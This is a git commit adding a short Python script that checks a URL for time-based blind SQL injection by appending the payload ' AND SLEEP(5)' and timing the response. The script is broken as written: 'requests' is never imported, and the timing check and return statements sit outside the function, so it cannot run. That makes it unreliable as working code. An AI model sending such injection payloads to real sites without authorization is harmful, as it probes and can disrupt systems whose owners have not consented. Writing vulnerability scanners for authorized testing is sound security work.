76cb75efca8271449075a651d3d1d90fcf78a587
Faris <36856116+fariskonnakkadan@users.noreply.github.com>
2022-12-18 19:19:47 +0530

    Create timebasedsqli.py

---
+++ timebasedsqli.py
@@ -0,0 +1,20 @@
+import time
+
+def check_vulnerability(url):
+  start_time = time.time()
+  #send request with injected payload
+  response = requests.get(url+" AND SLEEP(5)")
+  end_time = time.time()
+
+#if response time is more than 5 seconds, vulnerability is present
+if end_time - start_time > 5:
+  return True
+else:
+  return False
+
+url = "https://example.com/page?id=1"
+
+if check_vulnerability(url):
+  print("Time based blind SQL injection vulnerability is present")
+else:
+  print("Time based blind SQL injection vulnerability is not present")
